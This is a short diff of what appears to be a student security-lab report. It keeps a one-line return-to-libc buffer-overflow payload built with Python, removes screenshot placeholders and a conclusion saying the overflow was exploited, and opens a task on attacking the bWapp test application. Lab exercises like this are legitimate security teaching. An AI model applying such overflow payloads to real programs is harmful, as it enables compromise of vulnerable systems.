@@ -73,21 +73,9 @@ Description text (optional)
 ```
 r $(python -c "print('a'*20 + '\xb0\x0d\xe5\xf7' + '\xe0\x49\xe4\xf7' +  '\x58\xde\xff\xff')")
 ```
-![img4]()
 
 
-output screenshot (optional)
 
-- Before
-  
-![img5]()
-
-- After
-
-![win]()
-
-
-**Conclusion**: The buffer overflow vulnerability in the C program was successfully exploited using shellcode injection, return-to-lib-c.
 
 # Task 2: Attack on the database of bWapp 
 - Install bWapp (refer to quang-ute/Security-labs/Web-security). 
